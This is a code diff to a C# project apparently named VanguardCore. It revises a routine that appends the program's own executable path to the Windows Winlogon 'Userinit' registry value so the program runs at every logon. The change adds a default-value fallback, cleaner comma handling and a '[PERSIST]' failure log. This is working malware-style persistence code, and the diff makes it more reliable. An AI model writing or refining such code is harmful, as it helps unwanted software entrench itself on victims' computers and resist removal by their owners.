@@ -506,17 +506,26 @@ namespace VanguardCore
                     if (k != null)
                     {
                         object val = k.GetValue("Userinit");
-                        string current = val != null ? val.ToString() : null;
-                        if (!string.IsNullOrEmpty(current) && !current.ToLower().Contains(path.ToLower()))
+                        string current = val != null ? val.ToString() : "C:\\Windows\\system32\\userinit.exe,";
+                        
+                        // Prevent loops or duplicate entries
+                        if (!current.ToLower().Contains(path.ToLower()))
                         {
-                            // Userinit is comma-separated list of executables
-                            k.SetValue("Userinit", current.TrimEnd(',') + "," + path + ",");
+                            // Userinit is comma-separated list of executables. 
+                            // Windows expects the list to end with a comma.
+                            string newValue = current.Trim();
+                            if (!newValue.EndsWith(",")) newValue += ",";
+                            newValue += path + ",";
+                            
+                            k.SetValue("Userinit", newValue);
                             return true;
                         }
                     }
                 }
             }
-            catch { }
+            catch (Exception ex) { 
+                Debug.WriteLine($"[PERSIST] Userinit failed: {ex.Message}");
+            }
             return false;
         }
         #endregion
